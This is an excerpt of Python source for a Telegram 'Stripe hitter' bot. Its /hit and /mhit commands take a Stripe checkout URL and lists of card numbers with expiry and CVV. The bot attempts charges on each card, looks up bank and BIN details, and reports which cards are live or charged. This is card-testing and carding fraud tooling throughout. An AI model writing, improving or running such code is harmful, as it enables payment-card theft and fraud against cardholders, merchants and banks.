...
def _card_block(res: dict, session: Optional[CheckoutSession] = None) -> str:
    """Format a single card result matching the main bot style."""
    em = status_emoji(res["status"])
    status_label = res["status"]
    # Map internal status names to display labels used in examples
    if status_label == "CHARGED":
        status_label = "CHARGED"
    elif status_label == "DECLINED":
        status_label = "DEAD"
    elif status_label == "LIVE":
        status_label = "LIVE"

    bin_info = res.get("bin") or {}
    ...
    lines = [
        f"CC ➔ <code>{res['card']}</code>",
        f"Status ⌁ {status_label} {em}",
        f"Response ⌁ <code>{res['response']}</code>",
        f"BIN ⌁ {brand} ─ {ctype} ─ {level}",
        f"Bank ⌁ {bank}",
        f"Country ⌁ {flag} {country}",
        f"Time ⌁ {res.get('time', 0):.2f}s",
    ]
    return "\n".join(lines)
...
def fmt_result(res: dict, session: Optional[CheckoutSession] = None) -> str:
    if res["status"] == "CHARGED" and session:
        ...
        header = (
            f"「 STRIPE HITTER ─ /hit 」\n\n"
            f"Merchant ⌁ {site} ─ {amount}\n"
            f"Success URL ⌁ {confirm}\n\n"
        )
        return header + _card_block(res, session)

    return _card_block(res, session)
...
async def charge_card(cc_str: str, session: CheckoutSession) -> dict:
    ...
    if not card:
        return {"card": cc_str, "status": "INVALID", "response": "Invalid card format", "time": 0, "bin": {}}

    card_str = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
    result = {"card": card_str, "status": "FAILED", "response": "Unknown error", "time": 0, "bin": {}}
    ...
    result["bin"] = await lookup_bin(card["cc"])
...
async def _run_hits(update: Update, ctx: ContextTypes.DEFAULT_TYPE, raw: str, cards: list[str]):
    """Shared one-shot hitter: parse URL, load checkout, charge cards, live-edit message."""
    f = update.effective_user
    url = extract_checkout_url(raw) or raw
    if not url:
        await update.message.reply_text(
            "<b>⚠️ Usage:</b> <code>/hit https://... cc|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML)
        return
    ...
    session = await init_checkout(url)
    if isinstance(session, dict) and "error" in session:
        await placeholder.edit_text(
            f"{L}\n<b>❌ INIT FAILED</b>\n{L}\n\n{D} <code>{session['error']}</code>\n\n{L}",
            parse_mode=ParseMode.HTML)
        return

    price_str = f"{session.price} {session.currency or ''}".strip() if session.price is not None else "N/A"
    site = _site_line(session)
    header = (
        f"「 STRIPE HITTER ─ /hit 」\n\n"
        f"Merchant ⌁ {site} ─ {price_str}\n"
        f"Processed ⌁ 0/{len(cards)}"
    )
    await placeholder.edit_text(header, parse_mode=ParseMode.HTML)

    start_time = time.time()
    stats = {"charged": 0, "declined": 0, "tds": 0, "failed": 0}
    result_blocks: list[str] = []
    tried_cards: list[dict] = []
    stopped = False
    ...
    for i, cc in enumerate(cards, 1):
        ...
        processed_line = f"Processed ⌁ {i}/{len(cards)}"
        if stopped:
            processed_line += " ─ CHARGED ✅"
        footer = (
            f"\n{L}\n"
            f"Total Time ⌁ {round(time.time() - start_time, 2)}s\n"
            f"📊 BATCH | ✅ {stats['charged']} · ❌ {stats['declined']} · 🔐 {stats['tds']} · ⚠️ {stats['failed']}"
        )
        body = f"{header.replace('Processed ⌁ 0/{len(cards)}', processed_line)}\n\n" + "\n\n".join(result_blocks) + footer
        try:
    ...
    if not stopped:
        final_processed = f"Processed ⌁ {len(cards)}/{len(cards)} ─ COMPLETE"
        footer = (
            f"\n{L}\n"
            f"Total Time ⌁ {round(time.time() - start_time, 2)}s\n"
            f"📊 BATCH | ✅ {stats['charged']} · ❌ {stats['declined']} · 🔐 {stats['tds']} · ⚠️ {stats['failed']}"
        )
        body = f"{header.replace('Processed ⌁ 0/{len(cards)}', final_processed)}\n\n" + "\n\n".join(result_blocks) + footer
        try:
            await placeholder.edit_text(body, parse_mode=ParseMode.HTML)
        except Exception:
            pass
...
async def cmd_hit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ...
    if len(args) < 2:
        await update.message.reply_text(
            "<b>⚠️ Usage:</b> <code>/hit https://checkout.stripe.com/... 4111111111111111|01|26|123</code>",
            parse_mode=ParseMode.HTML)
        return

    # First arg that looks like a URL is the checkout; everything after is cards.
    url_idx = None
    for i, a in enumerate(args):
        if a.startswith("http") and ("checkout.stripe.com" in a or "/c/pay/cs_" in a or "/pay/cs_" in a or "buy.stripe.com" in a):
            url_idx = i
            break
    if url_idx is None:
        await update.message.reply_text(
            "<b>⚠️ Could not find checkout URL in args.</b>",
            parse_mode=ParseMode.HTML)
        return

    raw_url = args[url_idx]
    cards = args[url_idx + 1:]
    valid_cards = [c for c in cards if parse_card(c)]
    if not valid_cards:
        await update.message.reply_text(
    ...
    await _run_hits(update, ctx, raw_url, valid_cards)


async def cmd_chk(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Alias to /hit — kept for backward compatibility."""
    await cmd_hit(update, ctx)
...
async def cmd_mhit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Multi-card one-shot hitter: /mhit <url> <card1> [card2] ..."""
    f = update.effective_user
    if not await is_authorized(f.id):
        await update.message.reply_text(f"{L}\n<b>⛔ ACCESS DENIED</b>\n{L}", parse_mode=ParseMode.HTML)
        return
    ...
    if len(args) < 2:
        await update.message.reply_text(
            "<b>⚠️ Usage:</b> <code>/mhit https://checkout.stripe.com/... 4111|01|26|123 4222|02|27|456</code>",
            parse_mode=ParseMode.HTML)
        return
...
async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"{L}\n<b>ℹ️ /stop is no longer needed</b>\n{L}\n"
        f"<i>Use /hit or /mhit with URL + cards in one message.</i>\n\n{L}",
        parse_mode=ParseMode.HTML)


# ─── TEXT HANDLER (no longer used for bulk cards) ─────────────────────────────────────────────────
